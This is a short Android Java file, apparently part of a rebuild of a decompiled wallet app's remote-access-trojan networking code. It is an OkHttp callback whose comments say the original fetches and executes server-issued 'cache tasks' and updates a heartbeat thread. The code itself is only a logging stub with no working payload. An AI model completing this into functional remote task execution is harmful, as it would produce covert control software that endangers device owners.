package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.j (GetCacheTaskCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * GetCacheTaskCallback - 缓存任务获取回调
 * vendor: 解析 ApiResult<CacheTaskVO>，有数据时执行缓存任务，更新心跳线程状态
 */
public final class j implements Callback {

    private static final String TAG = "GetCacheTaskCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<CacheTaskVO>, executes task, updates heartThread hasCacheTask flag
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
